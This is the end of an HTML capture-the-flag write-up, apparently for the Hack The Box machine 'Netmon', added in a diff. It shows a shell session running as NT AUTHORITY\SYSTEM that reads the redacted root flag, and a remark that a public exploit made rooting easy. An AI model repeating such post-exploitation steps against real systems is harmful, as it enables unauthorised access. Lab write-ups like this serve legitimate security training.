+                System&nbsp;Locale:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en-us;English&nbsp;(United&nbsp;States)<br>
+                Input&nbsp;Locale:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en-us;English&nbsp;(United&nbsp;States)<br>
+                Time&nbsp;Zone:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(UTC-05:00)&nbsp;Eastern&nbsp;Time&nbsp;(US&nbsp;&amp;&nbsp;Canada)<br>
+                Total&nbsp;Physical&nbsp;Memory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4,096&nbsp;MB<br>
+                Available&nbsp;Physical&nbsp;Memory:&nbsp;3,287&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;Max&nbsp;Size:&nbsp;&nbsp;4,800&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;Available:&nbsp;4,041&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;In&nbsp;Use:&nbsp;&nbsp;&nbsp;&nbsp;759&nbsp;MB<br>
+                Page&nbsp;File&nbsp;Location(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\pagefile.sys<br>
+                Domain:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WORKGROUP<br>
+                Logon&nbsp;Server:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N/A<br>
+                Hotfix(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;Hotfix(s)&nbsp;Installed.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;KB3199986<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[02]:&nbsp;KB3200970<br>
+                Network&nbsp;Card(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;NIC(s)&nbsp;Installed.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;Intel(R)&nbsp;82574L&nbsp;Gigabit&nbsp;Network&nbsp;Connection<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connection&nbsp;Name:&nbsp;Ethernet0<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DHCP&nbsp;Enabled:&nbsp;&nbsp;&nbsp;&nbsp;No<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP&nbsp;address(es)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;10.10.10.152<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[02]:&nbsp;fe80::1d0a:72d9:7aae:8309<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[03]:&nbsp;dead:beef::1d0a:72d9:7aae:8309<br>
+                Hyper-V&nbsp;Requirements:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;hypervisor&nbsp;has&nbsp;been&nbsp;detected.&nbsp;Features&nbsp;required&nbsp;for&nbsp;Hyper-V&nbsp;will&nbsp;not&nbsp;be&nbsp;displayed.<br>
+                <br>
+                C:\Windows\system32&gt;whoami<br>
+                whoami<br>
+                nt&nbsp;authority\system<br>
+                <br>
+                C:\Windows\system32&gt;cd&nbsp;C:\<br>
+                cd&nbsp;C:\<br>
+                <br>
+                C:\&gt;dir<br>
+                dir<br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;684B-9CE8<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span>\<br>
+                <br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1,024&nbsp;.rnd<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>25<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inetpub<br>
+                07<span style="color:#ff9d00;font-weight:700">/</span>16<span style="color:#ff9d00;font-weight:700">/</span>2016&nbsp;&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>18&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PerfLogs<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>25<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>56&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>28&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>x86<span style="color:#ff9d00;font-weight:700">)</span><br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Users<br>
+                05<span style="color:#ff9d00;font-weight:700">/</span>14<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;04<span style="color:#ff9d00;font-weight:700">:</span>41&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1,024&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;12,025,307,136&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span>cd&nbsp;Users<span style="color:#333333;font-weight:400">\A</span>dministrator<br>
+                <span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Users<br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span><br>
+                <span style="color:#ff9d00;font-weight:700">dir</span><br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;684B-9CE8<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<br>
+                <br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>25<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>58&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>25<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>58&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Contacts<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>35&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Desktop<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Documents<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Downloads<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Favorites<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Links<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Music<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Pictures<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Saved&nbsp;Games<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Searches<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>25<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>06&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Videos<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;12,025,307,136&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#ffdd00;font-weight:400">&gt;</span>cd&nbsp;Desktop<br>
+                <span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Desktop<br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span><br>
+                <span style="color:#ff9d00;font-weight:700">dir</span><br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;684B-9CE8<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>35&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>35&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                02<span style="color:#ff9d00;font-weight:700">/</span>03<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>35&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33&nbsp;root.txt<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;12,025,303,040&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>type&nbsp;root.txt<br>
+                <span style="color:#ff9d00;font-weight:700">type</span>&nbsp;root.txt<br>
+                &lt;redacted&gt;
+            </div>
+        </div><br>
+        <br>
+        In all honesty I think I found an easy root method for the machine. Netmon was released on the 3rd March and the inital commit of the exploit I used was 31st March, so I think someone else had already done the hard work for me.
+    </writeup>
+</section>
+</body>
+</html>
